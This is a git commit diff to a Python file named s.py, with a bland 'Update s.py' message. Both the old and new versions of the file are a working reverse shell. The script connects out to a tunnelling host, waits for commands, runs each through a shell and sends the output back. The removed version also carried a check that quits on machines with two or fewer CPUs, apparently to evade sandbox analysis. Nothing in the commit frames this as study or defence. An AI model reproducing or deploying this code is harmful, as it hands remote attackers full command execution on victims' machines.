f9cb79a368e97db73ee2b233f527d25618524def
jwcqkjwckq <ghaithserver07@gmail.com>
2024-11-18 17:27:43 -0500

    Update s.py

--- s.py
+++ s.py
@@ -1,33 +1,33 @@
-import os
 import socket
 import subprocess
+import os
 
-
-if os.cpu_count() <= 2:
-    quit()
-
+# إعداد معلومات الاتصال
 HOST = 'dmicdg1.localto.net'
-PORT = 3908
-
+PORT = 4152
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT))
-s.send(str.encode("[*] Connection Established!"))
 
-while 1:
-    try:
-        s.send(str.encode(os.getcwd() + "> "))
-        data = s.recv(1024).decode("UTF-8")
-        data = data.strip('\n')
-        if data == "quit": 
-            break
-        if data[:2] == "cd":
-            os.chdir(data[3:])
-        if len(data) > 0:
-            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
-            stdout_value = proc.stdout.read() + proc.stderr.read()
-            output_str = str(stdout_value, "UTF-8")
-            s.send(str.encode("\n" + output_str))
-    except Exception as e:
-        continue
-    
+# إرسال رسالة عند نجاح الاتصال
+s.send(b"[*] Connection Established!\n")
+
+while True:
+    # إرسال الدليل الحالي
+    s.send(os.getcwd().encode() + b"> ")
+    data = s.recv(1024).decode("utf-8").strip()
+
+    if data.lower() == "quit":
+        break
+    elif data.startswith("cd"):
+        try:
+            os.chdir(data.split(" ")[1])
+        except FileNotFoundError as e:
+            s.send(str(e).encode())
+    else:
+        # تنفيذ الأمر وإرسال النتائج
+        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        stdout_value, stderr_value = proc.communicate()
+        output_str = stdout_value + stderr_value
+        s.send(output_str)
+
 s.close()
